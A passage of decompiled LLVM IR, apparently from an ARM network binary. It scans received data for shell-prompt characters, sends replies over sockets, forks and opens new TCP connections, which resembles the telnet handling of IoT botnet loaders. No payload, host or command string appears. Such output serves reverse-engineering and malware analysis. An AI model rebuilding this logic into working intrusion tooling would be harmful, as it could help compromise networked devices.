  %v1_129ac = add i32 %v0_129ac, 24
  %v2_129ac = inttoptr i32 %v1_129ac to i32*
  %v3_129ac = load i32, i32* %v2_129ac, align 4
  store i32 %v3_129ac, i32* %ip.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_129b4 = add i32 %v0_129ac, 12
  %v3_129b4 = inttoptr i32 %v2_129b4 to i32*
  store i32 9, i32* %v3_129b4, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_129bc:                               ; preds = %dec_label_pc_12458
  %v1_129bc = add i32 %v0_12458, 24
  %v2_129bc = inttoptr i32 %v1_129bc to i32*
  %v3_129bc = load i32, i32* %v2_129bc, align 4
  store i32 %v3_129bc, i32* %ip.global-to-local, align 4
  %v1_129c0 = add i32 %v3_129bc, -1
  store i32 %v1_129c0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_129c4 = icmp eq i32 %v1_129c0, 0
  store i1 %v2_129c4, i1* %cpsr_z.global-to-local, align 1
  %v5_129c8 = icmp sgt i32 %v1_129c0, 0
  br i1 %v5_129c8, label %dec_label_pc_129f0, label %dec_label_pc_123d8thread-pre-split.thread

dec_label_pc_129d0:                               ; preds = %bb339
  %v2_129d0 = icmp ugt i8 %v3_129f4, 35
  store i1 %v2_129d0, i1* %cpsr_c.global-to-local, align 1
  %v7_129d0 = icmp eq i8 %v3_129f4, 36
  store i1 %v7_129d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129d0, label %dec_label_pc_12a04, label %dec_label_pc_129d8

dec_label_pc_129d8:                               ; preds = %dec_label_pc_129d0
  %v2_129d8 = icmp ugt i8 %v3_129f4, 34
  store i1 %v2_129d8, i1* %cpsr_c.global-to-local, align 1
  %v7_129d8 = icmp eq i8 %v3_129f4, 35
  store i1 %v7_129d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129d8, label %dec_label_pc_12a04, label %dec_label_pc_129e0

dec_label_pc_129e0:                               ; preds = %dec_label_pc_129d8
  %v2_129e0 = icmp ugt i8 %v3_129f4, 36
  store i1 %v2_129e0, i1* %cpsr_c.global-to-local, align 1
  %v7_129e0 = icmp eq i8 %v3_129f4, 37
  store i1 %v7_129e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129e0, label %dec_label_pc_12a04, label %dec_label_pc_129e8

dec_label_pc_129e8:                               ; preds = %dec_label_pc_129e0
  %v1_129e8 = add i32 %v0_12a04, -1
  store i32 %v1_129e8, i32* %r0.global-to-local, align 4
  %v2_129e8 = icmp ne i32 %v0_12a04, 0
  store i1 %v2_129e8, i1* %cpsr_c.global-to-local, align 1
  %v7_129e8 = icmp eq i32 %v0_12a04, 1
  store i1 %v7_129e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129e8, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_129f0

dec_label_pc_129f0:                               ; preds = %dec_label_pc_129bc, %dec_label_pc_129e8
  %v0_12a04 = phi i32 [ %v1_129e8, %dec_label_pc_129e8 ], [ %v1_129c0, %dec_label_pc_129bc ]
  %v2_129f0 = add i32 %v0_12a04, %v0_12458
  store i32 %v2_129f0, i32* %r3.global-to-local, align 4
  %v1_129f4 = add i32 %v2_129f0, 28
  %v2_129f4 = inttoptr i32 %v1_129f4 to i8*
  %v3_129f4 = load i8, i8* %v2_129f4, align 1
  %v4_129f4 = zext i8 %v3_129f4 to i32
  store i32 %v4_129f4, i32* %r3.global-to-local, align 4
  %v2_129f8 = icmp ugt i8 %v3_129f4, 61
  store i1 %v2_129f8, i1* %cpsr_c.global-to-local, align 1
  %v7_129f8 = icmp eq i8 %v3_129f4, 62
  store i1 %v7_129f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_129f8, label %dec_label_pc_12a04, label %bb339

bb339:                                            ; preds = %dec_label_pc_129f0
  %v3_129fc = icmp ugt i8 %v3_129f4, 57
  store i1 %v3_129fc, i1* %cpsr_c.global-to-local, align 1
  %v8_129fc = icmp eq i8 %v3_129f4, 58
  store i1 %v8_129fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_129fc, label %dec_label_pc_12a04, label %dec_label_pc_129d0

dec_label_pc_12a04:                               ; preds = %dec_label_pc_129f0, %bb339, %dec_label_pc_129e0, %dec_label_pc_129d8, %dec_label_pc_129d0
  %v1_12a04 = add i32 %v0_12a04, 1
  store i32 %v1_12a04, i32* @r7, align 4
  %v2_12a08 = icmp eq i32 %v1_12a04, -1
  store i1 %v2_12a08, i1* %cpsr_c.global-to-local, align 1
  %v7_12a08 = icmp eq i32 %v0_12a04, -2
  store i1 %v7_12a08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12a08, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_12a10

dec_label_pc_12a10:                               ; preds = %dec_label_pc_12a04
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12a10 = icmp eq i32 %v1_12a04, 0
  store i1 %v2_12a10, i1* %cpsr_z.global-to-local, align 1
  %tmp340 = icmp slt i32 %v1_12a04, 1
  br i1 %tmp340, label %dec_label_pc_12568, label %dec_label_pc_12a18

dec_label_pc_12a18:                               ; preds = %dec_label_pc_12a10
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_12a1c = call i32 @function_13074(i32 20)
  store i32 %v2_128bc, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_12a2c = call i32 @function_12f90(i32 20, i32* nonnull %stack_var_-48)
  store i32 %v3_12a2c, i32* %r0.global-to-local, align 4
  %v3_12a30 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_12a30, i32* %r2.global-to-local, align 4
  store i32 %v3_12a2c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12a3c = load i32, i32* @r5, align 4
  %v1_12a3c = add i32 %v0_12a3c, 4
  %v2_12a3c = inttoptr i32 %v1_12a3c to i32*
  %v3_12a3c = load i32, i32* %v2_12a3c, align 4
  store i32 %v3_12a3c, i32* %r0.global-to-local, align 4
  %v4_12a40 = inttoptr i32 %v3_12a2c to i32*
  %v5_12a40 = call i32 @send(i32 %v3_12a3c, i32* %v4_12a40, i32 %v3_12a30, i32 16384)
  store i32 %v5_12a40, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12a50 = load i32, i32* @r5, align 4
  %v1_12a50 = add i32 %v0_12a50, 4
  %v2_12a50 = inttoptr i32 %v1_12a50 to i32*
  %v3_12a50 = load i32, i32* %v2_12a50, align 4
  store i32 %v3_12a50, i32* %r0.global-to-local, align 4
  %v5_12a54 = call i32 @send(i32 %v3_12a50, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_12a5c = call i32 @function_12fbc(i32 20)
  store i32 %v1_12a5c, i32* %r0.global-to-local, align 4
  %v0_12a60 = load i32, i32* @r5, align 4
  %v1_12a60 = add i32 %v0_12a60, 24
  %v2_12a60 = inttoptr i32 %v1_12a60 to i32*
  %v3_12a60 = load i32, i32* %v2_12a60, align 4
  store i32 %v3_12a60, i32* %ip.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v2_12a68 = add i32 %v0_12a60, 12
  %v3_12a68 = inttoptr i32 %v2_12a68 to i32*
  store i32 8, i32* %v3_12a68, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12a70:                               ; preds = %dec_label_pc_12458
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_12a74 = call i32 @function_13074(i32 26)
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_12a84 = call i32 @function_12f90(i32 26, i32* nonnull %stack_var_-56)
  %v3_12a88 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12a84, i32* %r2.global-to-local, align 4
  %v1_12a90 = add i32 %v3_12a88, -1
  store i32 %v1_12a90, i32* %r3.global-to-local, align 4
  %v0_12a94 = load i32, i32* @sb, align 4
  store i32 %v0_12a94, i32* %r0.global-to-local, align 4
  %v0_12a98 = load i32, i32* @r5, align 4
  %v1_12a98 = add i32 %v0_12a98, 24
  %v2_12a98 = inttoptr i32 %v1_12a98 to i32*
  %v3_12a98 = load i32, i32* %v2_12a98, align 4
  store i32 %v3_12a98, i32* %r1.global-to-local, align 4
  %v4_12a9c = call i32 @function_13a60(i32 %v0_12a94, i32 %v3_12a98, i32 %v3_12a84, i32 %v1_12a90)
  %v3_12aa0 = icmp eq i32 %v4_12a9c, -1
  store i1 %v3_12aa0, i1* %cpsr_c.global-to-local, align 1
  %v8_12aa0 = icmp eq i32 %v4_12a9c, -1
  store i1 %v8_12aa0, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_12aac = call i32 @function_12fbc(i32 26)
  br i1 %v3_12aa0, label %dec_label_pc_12aa8, label %dec_label_pc_12cdc

dec_label_pc_12aa8:                               ; preds = %dec_label_pc_12a70
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_12ab4 = call i32 @function_13074(i32 25)
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_12ac4 = call i32 @function_12f90(i32 25, i32* nonnull %stack_var_-56)
  store i32 %v3_12ac4, i32* %r0.global-to-local, align 4
  %v3_12ac8 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12ac4, i32* %r2.global-to-local, align 4
  %v1_12ad0 = add i32 %v3_12ac8, -1
  store i32 %v1_12ad0, i32* %r3.global-to-local, align 4
  %v0_12ad4 = load i32, i32* @r5, align 4
  %v1_12ad4 = add i32 %v0_12ad4, 24
  %v2_12ad4 = inttoptr i32 %v1_12ad4 to i32*
  %v3_12ad4 = load i32, i32* %v2_12ad4, align 4
  store i32 %v3_12ad4, i32* %r1.global-to-local, align 4
  %v0_12ad8 = load i32, i32* @sb, align 4
  store i32 %v0_12ad8, i32* %r0.global-to-local, align 4
  %v4_12adc = call i32 @function_13a60(i32 %v0_12ad8, i32 %v3_12ad4, i32 %v3_12ac4, i32 %v1_12ad0)
  store i32 %v4_12adc, i32* @r7, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_12ae8 = call i32 @function_12fbc(i32 25)
  store i32 %v1_12ae8, i32* %r0.global-to-local, align 4
  %v0_12aec = load i32, i32* @r7, align 4
  %v2_12aec = icmp eq i32 %v0_12aec, -1
  store i1 %v2_12aec, i1* %cpsr_c.global-to-local, align 1
  %v7_12aec = icmp eq i32 %v0_12aec, -1
  store i1 %v7_12aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12aec, label %dec_label_pc_123d4.loopexit, label %dec_label_pc_12af4

dec_label_pc_12af4:                               ; preds = %dec_label_pc_12aa8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12af4 = icmp eq i32 %v0_12aec, 0
  store i1 %v2_12af4, i1* %cpsr_z.global-to-local, align 1
  %tmp341 = icmp slt i32 %v0_12aec, 1
  br i1 %tmp341, label %dec_label_pc_12568, label %dec_label_pc_12afc

dec_label_pc_12afc:                               ; preds = %dec_label_pc_12af4
  %v0_12afc = load i32, i32* @r5, align 4
  %v1_12afc = add i32 %v0_12afc, 21
  %v2_12afc = inttoptr i32 %v1_12afc to i8*
  %v3_12afc = load i8, i8* %v2_12afc, align 1
  %v4_12afc = zext i8 %v3_12afc to i32
  store i32 %v4_12afc, i32* %r3.global-to-local, align 4
  %v1_12b00 = add i32 %v0_12afc, 20
  %v2_12b00 = inttoptr i32 %v1_12b00 to i8*
  %v3_12b00 = load i8, i8* %v2_12b00, align 1
  %v4_12b00 = zext i8 %v3_12b00 to i32
  store i32 %v4_12b00, i32* %r2.global-to-local, align 4
  %v1_12b04 = add i32 %v0_12afc, 16
  %v2_12b04 = inttoptr i32 %v1_12b04 to i32*
  %v3_12b04 = load i32, i32* %v2_12b04, align 4
  store i32 %v3_12b04, i32* %r1.global-to-local, align 4
  %v4_12b08 = mul nuw nsw i32 %v4_12afc, 256
  %v5_12b08 = or i32 %v4_12b00, %v4_12b08
  store i32 %v5_12b08, i32* %r2.global-to-local, align 4
  %v1_12b0c = and i32 %v4_12b00, 128
  %v2_12b0c = icmp ne i32 %v1_12b0c, 0
  store i1 %v2_12b0c, i1* %cpsr_c.global-to-local, align 1
  store i32 %v4_12afc, i32* %r3.global-to-local, align 4
  store i32 %v3_12b04, i32* %stack_var_-48, align 4
  store i32 %v5_12b08, i32* %stack_var_-38, align 4
  %v1_12b1c = inttoptr i32 %v0_12afc to i32*
  %v2_12b1c = load i32, i32* %v1_12b1c, align 4
  store i32 %v2_12b1c, i32* @fp, align 4
  %v0_12b20 = call i32 @fork()
  store i32 %v0_12b20, i32* %r0.global-to-local, align 4
  %v7_12b24 = icmp eq i32 %v0_12b20, -1
  %.357 = zext i1 %v7_12b24 to i32
  store i32 %.357, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12b30 = icmp eq i32 %v0_12b20, 0
  store i1 %v2_12b30, i1* %cpsr_z.global-to-local, align 1
  %tmp344 = icmp slt i32 %v0_12b20, 1
  br i1 %tmp344, label %bb345, label %.thread70

.thread70:                                        ; preds = %dec_label_pc_12afc
  store i32 1, i32* %sl.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_12b88

bb345:                                            ; preds = %dec_label_pc_12afc
  store i32 %.357, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12b3c = icmp eq i1 %v7_12b24, false
  store i1 %v2_12b3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12b3c, label %dec_label_pc_12b44, label %dec_label_pc_12b88

dec_label_pc_12b44:                               ; preds = %bb345
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_12b50 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_12b50, i32* %r0.global-to-local, align 4
  %v2_12b54 = icmp eq i32 %v3_12b50, -1
  store i1 %v2_12b54, i1* %cpsr_c.global-to-local, align 1
  %v7_12b54 = icmp eq i32 %v3_12b50, -1
  store i1 %v7_12b54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_12b50, i32* @r6, align 4
  br i1 %v7_12b54, label %dec_label_pc_12f88, label %dec_label_pc_12b60

dec_label_pc_12b60:                               ; preds = %dec_label_pc_12b44
  store i32 18, i32* %r0.global-to-local, align 4
  %v1_12b64 = call i32 @function_13074(i32 18)
  store i32 19, i32* %r0.global-to-local, align 4
  %v1_12b6c = call i32 @function_13074(i32 19)
  %v0_12b70 = load i32, i32* @sl, align 4
  store i32 %v0_12b70, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r0.global-to-local, align 4
  %v2_12b78 = inttoptr i32 %v0_12b70 to i32*
  %v3_12b78 = call i32 @function_12f90(i32 18, i32* %v2_12b78)
  store i32 %v3_12b78, i32* %r0.global-to-local, align 4
  %v1_12b7c = inttoptr i32 %v3_12b78 to i8*
  %v2_12b7c = call i32 @function_10e4c(i8* %v1_12b7c)
  store i32 %v2_12b7c, i32* %r0.global-to-local, align 4
  store i32 %v2_12b7c, i32* @r8, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_12b80 = icmp eq i32 %v2_12b7c, 0
  store i1 %v3_12b80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_12b80, label %dec_label_pc_12b88, label %dec_label_pc_12e58

dec_label_pc_12b88:                               ; preds = %.thread70, %dec_label_pc_12b60, %bb345
  %v0_12b88 = load i32, i32* @r5, align 4
  %v1_12b88 = add i32 %v0_12b88, 4
  %v2_12b88 = inttoptr i32 %v1_12b88 to i32*
  %v3_12b88 = load i32, i32* %v2_12b88, align 4
  store i32 %v3_12b88, i32* %r0.global-to-local, align 4
  %v1_12b8c = call i32 @close(i32 %v3_12b88)
  store i32 %v1_12b8c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_12b98 = load i32, i32* @r5, align 4
  %v1_12b98 = add i32 %v0_12b98, 24
  %v2_12b98 = inttoptr i32 %v1_12b98 to i32*
  %v3_12b98 = load i32, i32* %v2_12b98, align 4
  store i32 %v3_12b98, i32* %ip.global-to-local, align 4
  %v2_12b9c = add i32 %v0_12b98, 4
  %v3_12b9c = inttoptr i32 %v2_12b9c to i32*
  store i32 -1, i32* %v3_12b9c, align 4
  %v0_12ba0 = load i32, i32* %r2.global-to-local, align 4
  %v1_12ba0 = load i32, i32* @r5, align 4
  %v2_12ba0 = add i32 %v1_12ba0, 12
  %v3_12ba0 = inttoptr i32 %v2_12ba0 to i32*
  store i32 %v0_12ba0, i32* %v3_12ba0, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12ba4:                               ; preds = %.thread205, %dec_label_pc_12c24, %dec_label_pc_12df4, %dec_label_pc_12d0c, %dec_label_pc_12a18, %dec_label_pc_12964, %dec_label_pc_128b0, %dec_label_pc_127fc, %dec_label_pc_12764, %dec_label_pc_125d4, %dec_label_pc_12570, %dec_label_pc_12b88
  %v0_12ba4 = load i32, i32* %ip.global-to-local, align 4
  %v1_12ba4 = load i32, i32* @r7, align 4
  %v2_12ba4 = sub i32 %v0_12ba4, %v1_12ba4
  %v3_12ba4 = icmp uge i32 %v0_12ba4, %v1_12ba4
  store i1 %v3_12ba4, i1* %cpsr_c.global-to-local, align 1
  %v4_12ba4 = xor i32 %v1_12ba4, %v0_12ba4
  %v5_12ba4 = xor i32 %v2_12ba4, %v0_12ba4
  %v6_12ba4 = and i32 %v5_12ba4, %v4_12ba4
  %v7_12ba4 = icmp slt i32 %v6_12ba4, 0
  %v8_12ba4 = icmp slt i32 %v2_12ba4, 0
  %v9_12ba4 = icmp eq i32 %v0_12ba4, %v1_12ba4
  store i1 %v9_12ba4, i1* %cpsr_z.global-to-local, align 1
  %v2_12ba8 = xor i1 %v8_12ba4, %v7_12ba4
  %v0_12ba4.v1_12ba4 = select i1 %v2_12ba8, i32 %v0_12ba4, i32 %v1_12ba4
  store i32 %v0_12ba4.v1_12ba4, i32* %r1.global-to-local, align 4
  %v2_12bb0 = sub i32 %v0_12ba4, %v0_12ba4.v1_12ba4
  store i32 %v2_12bb0, i32* %r2.global-to-local, align 4
  %v1_12bb4 = load i32, i32* @r5, align 4
  %v2_12bb4 = add i32 %v1_12bb4, 24
  %v3_12bb4 = inttoptr i32 %v2_12bb4 to i32*
  store i32 %v2_12bb0, i32* %v3_12bb4, align 4
  %v0_12bb8 = load i32, i32* @sb, align 4
  %v1_12bb8 = load i32, i32* %r1.global-to-local, align 4
  %v2_12bb8 = add i32 %v1_12bb8, %v0_12bb8
  store i32 %v2_12bb8, i32* %r1.global-to-local, align 4
  store i32 %v0_12bb8, i32* %r0.global-to-local, align 4
  %v3_12bc0 = call i32 @_memmove(i32 %v0_12bb8, i32 %v2_12bb8, i32 %v2_12bb0)
  store i32 %v3_12bc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12458

dec_label_pc_12bc8:                               ; preds = %dec_label_pc_12458
  %v1_12bc8 = add i32 %v0_12458, 24
  %v2_12bc8 = inttoptr i32 %v1_12bc8 to i32*
  %v3_12bc8 = load i32, i32* %v2_12bc8, align 4
  store i32 %v3_12bc8, i32* %ip.global-to-local, align 4
  %v1_12bcc = add i32 %v3_12bc8, -1
  store i32 %v1_12bcc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12bd0 = icmp eq i32 %v1_12bcc, 0
  store i1 %v2_12bd0, i1* %cpsr_z.global-to-local, align 1
  %v5_12bd4 = icmp sgt i32 %v1_12bcc, 0
  br i1 %v5_12bd4, label %dec_label_pc_12bfc, label %dec_label_pc_123d8thread-pre-split.thread

dec_label_pc_12bdc:                               ; preds = %bb348
  %v2_12bdc = icmp ugt i8 %v3_12c00, 35
  store i1 %v2_12bdc, i1* %cpsr_c.global-to-local, align 1
  %v7_12bdc = icmp eq i8 %v3_12c00, 36
  store i1 %v7_12bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12bdc, label %dec_label_pc_12c10, label %dec_label_pc_12be4

dec_label_pc_12be4:                               ; preds = %dec_label_pc_12bdc
  %v2_12be4 = icmp ugt i8 %v3_12c00, 34
  store i1 %v2_12be4, i1* %cpsr_c.global-to-local, align 1
  %v7_12be4 = icmp eq i8 %v3_12c00, 35
  store i1 %v7_12be4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12be4, label %dec_label_pc_12c10, label %dec_label_pc_12bec

dec_label_pc_12bec:                               ; preds = %dec_label_pc_12be4
  %v2_12bec = icmp ugt i8 %v3_12c00, 36
  store i1 %v2_12bec, i1* %cpsr_c.global-to-local, align 1
  %v7_12bec = icmp eq i8 %v3_12c00, 37
  store i1 %v7_12bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12bec, label %dec_label_pc_12c10, label %dec_label_pc_12bf4

dec_label_pc_12bf4:                               ; preds = %dec_label_pc_12bec
  %v1_12bf4 = add i32 %v0_12c10, -1
  store i32 %v1_12bf4, i32* %r0.global-to-local, align 4
  %v2_12bf4 = icmp ne i32 %v0_12c10, 0
  store i1 %v2_12bf4, i1* %cpsr_c.global-to-local, align 1
  %v7_12bf4 = icmp eq i32 %v0_12c10, 1
  store i1 %v7_12bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12bf4, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_12bfc

dec_label_pc_12bfc:                               ; preds = %dec_label_pc_12bc8, %dec_label_pc_12bf4
  %v0_12c10 = phi i32 [ %v1_12bf4, %dec_label_pc_12bf4 ], [ %v1_12bcc, %dec_label_pc_12bc8 ]
  %v2_12bfc = add i32 %v0_12c10, %v0_12458
  store i32 %v2_12bfc, i32* %r3.global-to-local, align 4
  %v1_12c00 = add i32 %v2_12bfc, 28
  %v2_12c00 = inttoptr i32 %v1_12c00 to i8*
  %v3_12c00 = load i8, i8* %v2_12c00, align 1
  %v4_12c00 = zext i8 %v3_12c00 to i32
  store i32 %v4_12c00, i32* %r3.global-to-local, align 4
  %v2_12c04 = icmp ugt i8 %v3_12c00, 61
  store i1 %v2_12c04, i1* %cpsr_c.global-to-local, align 1
  %v7_12c04 = icmp eq i8 %v3_12c00, 62
  store i1 %v7_12c04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c04, label %dec_label_pc_12c10, label %bb348

bb348:                                            ; preds = %dec_label_pc_12bfc
  %v3_12c08 = icmp ugt i8 %v3_12c00, 57
  store i1 %v3_12c08, i1* %cpsr_c.global-to-local, align 1
  %v8_12c08 = icmp eq i8 %v3_12c00, 58
  store i1 %v8_12c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_12c08, label %dec_label_pc_12c10, label %dec_label_pc_12bdc

dec_label_pc_12c10:                               ; preds = %dec_label_pc_12bfc, %bb348, %dec_label_pc_12bec, %dec_label_pc_12be4, %dec_label_pc_12bdc
  %v1_12c10 = add i32 %v0_12c10, 1
  store i32 %v1_12c10, i32* @r7, align 4
  %v2_12c14 = icmp eq i32 %v1_12c10, -1
  store i1 %v2_12c14, i1* %cpsr_c.global-to-local, align 1
  %v7_12c14 = icmp eq i32 %v0_12c10, -2
  store i1 %v7_12c14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12c14, label %dec_label_pc_123d8thread-pre-split, label %dec_label_pc_12c1c

dec_label_pc_12c1c:                               ; preds = %dec_label_pc_12c10
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_12c1c = icmp eq i32 %v1_12c10, 0
  store i1 %v2_12c1c, i1* %cpsr_z.global-to-local, align 1
  %tmp349 = icmp slt i32 %v1_12c10, 1
  br i1 %tmp349, label %dec_label_pc_12568, label %dec_label_pc_12c24

dec_label_pc_12c24:                               ; preds = %dec_label_pc_12c1c
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_12c28 = call i32 @function_13074(i32 24)
  store i32 %v2_12808, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_12c38 = call i32 @function_12f90(i32 24, i32* nonnull %stack_var_-56)
  store i32 %v3_12c38, i32* %r0.global-to-local, align 4
  %v3_12c3c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_12c3c, i32* %r2.global-to-local, align 4
  store i32 %v3_12c38, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12c48 = load i32, i32* @r5, align 4
  %v1_12c48 = add i32 %v0_12c48, 4
  %v2_12c48 = inttoptr i32 %v1_12c48 to i32*
  %v3_12c48 = load i32, i32* %v2_12c48, align 4
  store i32 %v3_12c48, i32* %r0.global-to-local, align 4
  %v4_12c4c = inttoptr i32 %v3_12c38 to i32*
  %v5_12c4c = call i32 @send(i32 %v3_12c48, i32* %v4_12c4c, i32 %v3_12c3c, i32 16384)
  store i32 %v5_12c4c, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_142f0.88 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_12c5c = load i32, i32* @r5, align 4
  %v1_12c5c = add i32 %v0_12c5c, 4
  %v2_12c5c = inttoptr i32 %v1_12c5c to i32*
  %v3_12c5c = load i32, i32* %v2_12c5c, align 4
  store i32 %v3_12c5c, i32* %r0.global-to-local, align 4
  %v5_12c60 = call i32 @send(i32 %v3_12c5c, i32* bitcast ([3 x i8]* @global_var_142f0.88 to i32*), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_12c68 = call i32 @function_12fbc(i32 24)
  store i32 %v1_12c68, i32* %r0.global-to-local, align 4
  %v0_12c6c = load i32, i32* @r5, align 4
  %v1_12c6c = add i32 %v0_12c6c, 24
  %v2_12c6c = inttoptr i32 %v1_12c6c to i32*
  %v3_12c6c = load i32, i32* %v2_12c6c, align 4
  store i32 %v3_12c6c, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v2_12c74 = add i32 %v0_12c6c, 12
  %v3_12c74 = inttoptr i32 %v2_12c74 to i32*
  store i32 10, i32* %v3_12c74, align 4
  br label %dec_label_pc_12ba4

dec_label_pc_12c7c:                               ; preds = %dec_label_pc_124e8
  store i32 ptrtoint (i32* @global_var_145a9.384 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_124a0, i32* %r0.global-to-local, align 4
  %v5_12c88 = call i32* @memcpy(i32* nonnull %stack_var_-41, i32* nonnull @global_var_145a9.384, i32 3)
  store i32 9, i32* %r2.global-to-local, align 4
  store i32 %v2_12c94, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_145a0.386 to i32), i32* %r1.global-to-local, align 4
  %v5_12c9c = call i32* @memcpy(i32* nonnull %stack_var_-73, i32* nonnull @global_var_145a0.386, i32 9)
  %v7_12c9c = ptrtoint i32* %v5_12c9c to i32
  store i32 %v7_12c9c, i32* %r0.global-to-local, align 4
  %v0_12ca0 = load i32, i32* @r5, align 4
  %v1_12ca0 = add i32 %v0_12ca0, 24
  %v2_12ca0 = inttoptr i32 %v1_12ca0 to i32*
  %v3_12ca0 = load i32, i32* %v2_12ca0, align 4
  store i32 %v3_12ca0, i32* %ip.global-to-local, align 4
  %v0_12ca4 = load i32, i32* @r6, align 4
  %v1_12ca4 = add i32 %v0_12ca4, 2
  store i32 %v1_12ca4, i32* %r2.global-to-local, align 4
  %v0_12ca8 = load i32, i32* @sb, align 4
  %v2_12ca8 = add i32 %v0_12ca8, %v3_12ca0
  store i32 %v2_12ca8, i32* %r3.global-to-local, align 4
  %v3_12cac = icmp uge i32 %v2_12ca8, %v1_12ca4
  store i1 %v3_12cac, i1* %cpsr_c.global-to-local, align 1
  %v9_12cac = icmp eq i32 %v2_12ca8, %v1_12ca4
  store i1 %v9_12cac, i1* %cpsr_z.global-to-local, align 1
  %v2_12cb0 = xor i1 %v3_12cac, true
  %v3_12cb0 = or i1 %v9_12cac, %v2_12cb0
  br i1 %v3_12cb0, label %dec_label_pc_12c7c.dec_label_pc_12558.loopexit_crit_edge, label %dec_label_pc_12cb4

dec_label_pc_12c7c.dec_label_pc_12558.loopexit_crit_edge: ; preds = %dec_label_pc_12c7c
  %v0_12558.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_12558

dec_label_pc_12cb4:                               ; preds = %dec_label_pc_12c7c
  %v0_12cb4 = load i32, i32* @r4, align 4
  %v1_12cb4 = add i32 %v0_12cb4, 1
  %v2_12cb4 = inttoptr i32 %v1_12cb4 to i8*
  %v3_12cb4 = load i8, i8* %v2_12cb4, align 1
  %v4_12cb4 = zext i8 %v3_12cb4 to i32
  store i32 %v4_12cb4, i32* %r3.global-to-local, align 4
  %v2_12cb8 = icmp ugt i8 %v3_12cb4, 30
  store i1 %v2_12cb8, i1* %cpsr_c.global-to-local, align 1
  %v7_12cb8 = icmp eq i8 %v3_12cb4, 31
  store i1 %v7_12cb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_12cb8, label %dec_label_pc_12da8, label %dec_label_pc_12cc0

